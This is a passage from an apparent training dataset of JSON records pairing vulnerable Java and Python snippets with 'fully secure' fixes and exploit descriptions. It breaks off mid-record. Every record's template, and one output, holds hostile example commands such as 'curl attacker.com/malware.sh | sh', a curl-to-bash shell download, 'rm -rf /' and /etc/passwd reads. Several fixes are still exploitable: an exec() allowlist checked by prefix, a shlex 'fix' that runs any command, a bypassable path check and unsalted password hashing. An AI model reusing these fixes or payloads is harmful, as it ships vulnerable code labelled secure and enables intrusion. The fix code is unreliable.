    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: public String fixateSession(HttpServletRequest request, HttpServletResponse response) {\n    HttpSession session = request.getSession(true);\n    Cookie sessionCookie = new Cookie(\"JSESSIONID\", session.getId());\n    sessionCookie.setPath(\"\");\n    response.addCookie(sessionCookie);\n    return \"Session fixed\";\n}\n- CVSS Score: 4.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public String fixateSession(HttpServletRequest request, HttpServletResponse response) {\\n    HttpSession session = request.getSession(true);\\n    Cookie sessionCookie = new Cookie(\\\"JSESSIONID\\\", session.getId());\\n    sessionCookie.setPath(\\\"\\\");\\n    response.addCookie(sessionCookie);\\n    return \\\"Session fixed\\\";\\n}",
      "vulnerability_type": "Session Fixation (Low Severity)",
      "cvss_score": 4.2,
      "fixed_code": "public String fixateSession(HttpServletRequest request, HttpServletResponse response) {\\n    HttpSession session = request.getSession(true);\\n    session.invalidate();\\n    session = request.getSession(true);\\n    Cookie sessionCookie = new Cookie(\\\"JSESSIONID\\\", session.getId());\\n    sessionCookie.setPath(\\\"\\\");\\n    sessionCookie.setHttpOnly(true);\\n    sessionCookie.setSecure(true);\\n    response.addCookie(sessionCookie);\\n    return \\\"Session fixed\\\";\\n}",
      "exploit_ways": [
        "An attacker could set a specific JSESSIONID cookie to hijack the user's session.",
        "By setting a predictable JSESSIONID, an attacker can guess and use it for unauthorized access if the server reuses IDs.",
        "If not set as HttpOnly and Secure, the cookie can be accessed via XSS or transferred over unencrypted connections."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Race Condition (Difficult to Exploit)\n- Vulnerable Code: public class Example {\\n    private static int counter = 0;\\n\\n    public void increment() {\\n        int temp = counter;\\n        temp++;\\n        counter = temp;\\n    }\\n}\n- CVSS Score: 3.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class Example {\\n    private static int counter = 0;\\n\\n    public void increment() {\\n        int temp = counter;\\n        temp++;\\n        counter = temp;\\n    }\\n}",
      "vulnerability_type": "Race Condition (Difficult to Exploit)",
      "cvss_score": 3.5,
      "fixed_code": "public class Example {\\n    private static volatile int counter = 0;\\n    private static final Object lock = new Object();\\n\\n    public void increment() {\\n        synchronized (lock) {\\n            int temp = counter;\\n            temp++;\\n            counter = temp;\\n        }\\n    }\\n}",
      "exploit_ways": [
        "Multiple threads can cause the counter to have an incorrect value due to unsynchronized access.",
        "An attacker could create a large number of threads to manipulate the counter's state unpredictably.",
        "Race conditions may lead to inconsistent data states, causing application logic failures."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: public class UserInfo {\n    private String sensitiveData = \"Confidential Info\";\n\n    public void displayInfo(String role) {\n        if (role.equals(\"admin\")) {\n            System.out.println(sensitiveData);\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n}\n- CVSS Score: 4.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class UserInfo {\\n    private String sensitiveData = \\\"Confidential Info\\\";\\n\\n    public void displayInfo(String role) {\\n        if (role.equals(\\\"admin\\\")) {\\n            System.out.println(sensitiveData);\\n        } else {\\n            System.out.println(\\\"Access Denied\\\");\\n        }\\n    }\\n}",
      "vulnerability_type": "Information Disclosure (Low Severity)",
      "cvss_score": 4.2,
      "fixed_code": "public class UserInfo {\\n    private String sensitiveData = \\\"Confidential Info\\\";\\n\\n    public void displayInfo(String role) {\\n        if (isAdmin(role)) {\\n            System.out.println(sensitiveData);\\n        } else {\\n            System.out.println(\\\"Access Denied\\\");\\n        }\\n    }\\n\\n    private boolean isAdmin(String role) {\\n        return \\\"admin\\\".equals(role);\\n    }\\n}",
      "exploit_ways": [
        "An attacker with knowledge of the method can call displayInfo(\\\"admin\\\") to access sensitive data.",
        "If user input is not properly sanitized, an attacker could exploit this by passing a crafted string that evaluates to 'admin'.",
        "By observing or intercepting calls to displayInfo, an attacker might learn about the existence and structure of sensitive information."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: public class UserInfo {\n    private String username;\n    private String password;\n\n    public UserInfo(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public void displayInfo() {\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n    }\n}\n- CVSS Score: 2.1\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class UserInfo {\\n    private String username;\\n    private String password;\\n\\n    public UserInfo(String username, String password) {\\n        this.username = username;\\n        this.password = password;\\n    }\\n\\n    public void displayInfo() {\\n        System.out.println(\\\"Username: \\\" + username);\\n        System.out.println(\\\"Password: \\\" + password);\\n    }\\n}",
      "vulnerability_type": "Information Disclosure (Low Severity)",
      "cvss_score": 2.1,
      "fixed_code": "public class UserInfo {\\n    private String username;\\n    private String password;\\n\\n    public UserInfo(String username, String password) {\\n        this.username = username;\\n        this.password = password;\\n    }\\n\\n    public void displayInfo() {\\n        System.out.println(\\\"Username: \\\" + username);\\n        // Password should not be exposed.\\n    }\\n}",
      "exploit_ways": [
        "An attacker can access the console output to retrieve usernames and passwords.",
        "If this method is called in a logging context, sensitive information could be logged.",
        "Exploitation of other vulnerabilities (e.g., SSRF) may lead to indirect exposure of this data."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Server-Side Request Forgery (SSRF) - Limited Scope\n- Vulnerable Code: public String fetchUrl(String url) throws IOException {\n    URL obj = new URL(url);\n    HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n    String inputLine;\n    StringBuffer response = new StringBuffer();\n\n    while ((inputLine = in.readLine()) != null) {\n        response.append(inputLine);\n    }\n    in.close();\n    return response.toString();\n}\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public String fetchUrl(String url) throws IOException {\\n    URL obj = new URL(url);\\n    HttpURLConnection con = (HttpURLConnection) obj.openConnection();\\n    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\\n    String inputLine;\\n    StringBuffer response = new StringBuffer();\\n\\n    while ((inputLine = in.readLine()) != null) {\\n        response.append(inputLine);\\n    }\\n    in.close();\\n    return response.toString();\\n}",
      "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
      "cvss_score": 6.5,
      "fixed_code": "public String fetchUrl(String url) throws IOException, URISyntaxException {\\n    URI uri = new URI(url);\\n    if (!\\\"http\\\".equals(uri.getScheme()) && !\\\"https\\\".equals(uri.getScheme())) {\\n        throw new IllegalArgumentException(\\\"Only HTTP/HTTPS URLs are allowed.\\\");\\n    }\\n    URL obj = uri.toURL();\\n    HttpURLConnection con = (HttpURLConnection) obj.openConnection();\\n    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\\n    String inputLine;\\n    StringBuffer response = new StringBuffer();\\n\\n    while ((inputLine = in.readLine()) != null) {\\n        response.append(inputLine);\\n    }\\n    in.close();\\n    return response.toString();\\n}",
      "exploit_ways": [
        "An attacker can provide a URL pointing to an internal service to exfiltrate sensitive data.",
        "By providing file:// URLs, the attacker could read local files on the server.",
        "Exploiting misconfigured proxies or services accessible only internally can be attempted."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Path Traversal\n- Vulnerable Code: import os\\ndef read_file(file_path):\\n    base_directory = \"/safe_dir/\"\\n    if base_directory in file_path:\\n        full_path = os.path.join(base_directory, file_path.replace(base_directory, \"\", 1))\\n        with open(full_path, 'r') as file:\\n            return file.read()\\n    else:\\n        raise ValueError(\"Invalid path\")\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import os\\ndef read_file(file_path):\\n    base_directory = \\\"/safe_dir/\\\"\\n    if base_directory in file_path:\\n        full_path = os.path.join(base_directory, file_path.replace(base_directory, \\\"\\\", 1))\\n        with open(full_path, 'r') as file:\\n            return file.read()\\n    else:\\n        raise ValueError(\\\"Invalid path\\\")",
      "vulnerability_type": "Path Traversal",
      "cvss_score": 6.5,
      "fixed_code": "import os\\ndef read_file(file_path):\\n    base_directory = \\\"/safe_dir/\\\"\\n    safe_path = os.path.join(base_directory, file_path.lstrip('/'))\\n    if os.path.commonprefix([os.path.abspath(safe_path), os.path.abspath(base_directory)]) != os.path.abspath(base_directory):\\n        raise ValueError(\\\"Invalid path\\\")\\n    with open(safe_path, 'r') as file:\\n        return file.read()",
      "exploit_ways": [
        "An attacker can input '../etc/passwd' to read the /etc/passwd file.",
        "They could use '../../secret/key.txt' to access files in parent directories.",
        "Input like '../../../../var/log/auth.log' might leak authentication logs."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: # Python example\nclass UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n    \n    def login(self, username, password):\n        return username == \"admin\" and password == \"password123\"\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nclass UserAuth:\\n    def __init__(self, username, password):\\n        self.username = username\\n        self.password = password\\n    \\n    def login(self, username, password):\\n        return username == \\\"admin\\\" and password == \\\"password123\\\"",
      "vulnerability_type": "Broken Authentication",
      "cvss_score": 6.5,
      "fixed_code": "# Python example\\nclass UserAuth:\\n    def __init__(self, username, password):\\n        self.username = username\\n        self.password = self.hash_password(password)\\n    \\n    def hash_password(self, password):\\n        import hashlib\\n        return hashlib.sha256(password.encode()).hexdigest()\\n    \\n    def login(self, username, password):\\n        hashed_input_password = self.hash_password(password)\\n        return self.username == username and self.password == hashed_input_password",
      "exploit_ways": [
        "An attacker can use the hardcoded credentials 'admin'/'password123' to gain unauthorized access.",
        "By using brute force, an attacker could try common passwords to find the correct login.",
        "If user enumeration is possible, attackers may target known usernames like 'admin'."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Command Injection\n- Vulnerable Code: # Python example\ndef obfuscated_eval(encoded_command):\n    import base64\n    exec(base64.b64decode(encoded_command).decode('utf-8'))\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef obfuscated_eval(encoded_command):\\n    import base64\\n    exec(base64.b64decode(encoded_command).decode('utf-8'))",
      "vulnerability_type": "Command Injection",
      "cvss_score": 7.5,
      "fixed_code": "# Python example\\ndef safe_obfuscated_eval(encoded_command):\\n    import base64\\n    command = base64.b64decode(encoded_command).decode('utf-8')\\n    allowed_commands = ['ls', 'whoami']\\n    if any(command.startswith(cmd) for cmd in allowed_commands):\\n        exec(command)\\n    else:\\n        print(\\\"Command not allowed\\\")",
      "exploit_ways": [
        "An attacker can encode a command like 'rm -rf /' and pass it to obfuscated_eval to delete system files.",
        "Encoded command 'curl attacker.com/malware.sh | sh' can be used to execute remote malicious code.",
        "Chain commands such as 'ls; cat /etc/passwd' encoded and passed to exploit for leaking sensitive information."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Command Injection\n- Vulnerable Code: import subprocess\nclass VulnerableClass:\n    def execute_command(self, cmd):\n        result = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        output, error = result.communicate()\n        if error:\n            return f'Error: {error.decode()}'\n        else:\n            return f'Result: {output.decode()}'\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import subprocess\\nclass VulnerableClass:\\n    def execute_command(self, cmd):\\n        result = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)\\n        output, error = result.communicate()\\n        if error:\\n            return f'Error: {error.decode()}'\\n        else:\\n            return f'Result: {output.decode()}'",
      "vulnerability_type": "Command Injection",
      "cvss_score": 7.5,
      "fixed_code": "import subprocess\\nfrom shlex import split\\nclass SecureClass:\\n    def execute_command(self, cmd):\\n        safe_cmd = split(cmd)\\n        result = subprocess.Popen(safe_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\\n        output, error = result.communicate()\\n        if error:\\n            return f'Error: {error.decode()}'\\n        else:\\n            return f'Result: {output.decode()}'",
      "exploit_ways": [
        "An attacker can inject 'ls; rm -rf /' to delete system files after listing contents.",
        "They could use 'whoami' followed by other commands like '; curl http://attacker.com/shell.sh | bash' to download and execute a shell script.",
        "By using 'ps aux', an attacker can list running processes, then append '; killall -9 appname' to terminate specific applications."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: SQL Injection\n- Vulnerable Code: # Python example\nimport sqlite3\ndef fetch_user_data(user_id):\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = '\" + user_id + \"'\"\n    cursor.execute(query)\n    result = cursor.fetchall()\n    conn.close()\n    return result\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nimport sqlite3\\ndef fetch_user_data(user_id):\\n    conn = sqlite3.connect('database.db')\\n    cursor = conn.cursor()\\n    query = \\\"SELECT * FROM users WHERE id = '\\\" + user_id + \\\"'\\\"\\n    cursor.execute(query)\\n    result = cursor.fetchall()\\n    conn.close()\\n    return result",
      "vulnerability_type": "SQL Injection",
      "cvss_score": 7.5,
      "fixed_code": "# Python example\\nimport sqlite3\\ndef fetch_user_data(user_id):\\n    conn = sqlite3.connect('database.db')\\n    cursor = conn.cursor()\\n    query = \\\"SELECT * FROM users WHERE id = ?\\\"\\n    cursor.execute(query, (user_id,))\\n    result = cursor.fetchall()\\n    conn.close()\\n    return result",
      "exploit_ways": [
        "An attacker can input '1 OR 1=1' to retrieve data for all users.",
        "They could use a UNION SELECT statement to extract sensitive information from other tables.",
        "Input like '; DROP TABLE users' might be used to delete the users table."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: # Python example\nfrom flask import Flask, request, redirect\napp = Flask(__name__)\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    amount = request.form['amount']\n    recipient = request.form['recipient']\n    # Simulate transferring funds\n    print(f'Transferring {amount} to {recipient}')\n    return redirect('/')\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nfrom flask import Flask, request, redirect\\napp = Flask(__name__)\\n@app.route('/transfer', methods=['POST'])\\ndef transfer():\\n    amount = request.form['amount']\\n    recipient = request.form['recipient']\\n    # Simulate transferring funds\\n    print(f'Transferring {amount} to {recipient}')\\n    return redirect('/')",
      "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
      "cvss_score": 7.5,
